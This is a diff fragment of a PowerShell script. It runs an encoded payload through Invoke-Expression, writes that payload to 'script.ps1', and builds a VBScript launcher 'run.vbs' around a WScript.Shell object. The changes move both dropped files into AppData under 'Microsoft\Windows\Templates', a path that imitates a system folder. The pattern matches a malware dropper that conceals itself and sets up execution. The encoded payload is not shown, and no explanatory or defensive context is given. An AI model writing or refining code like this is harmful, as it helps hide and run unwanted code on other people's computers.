@@ -9,17 +9,18 @@ Invoke-Expression $encodedScript
 '@
 
 
-$programsFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Programs)
+$programsFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
+
+$scriptPath = Join-Path $programsFolder "Microsoft\Windows\Templates\script.ps1"
 
 
-$scriptPath = Join-Path $programsFolder "script.ps1"
 $code | Out-File -FilePath $scriptPath -Encoding ascii
 
 
-$startupFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Programs)
+$startupFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
 
 
-$batchScriptPath = Join-Path $startupFolder "run.vbs"
+$batchScriptPath = Join-Path $startupFolder "Microsoft\Windows\Templates\run.vbs"
 $batchCode = @"
 ' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
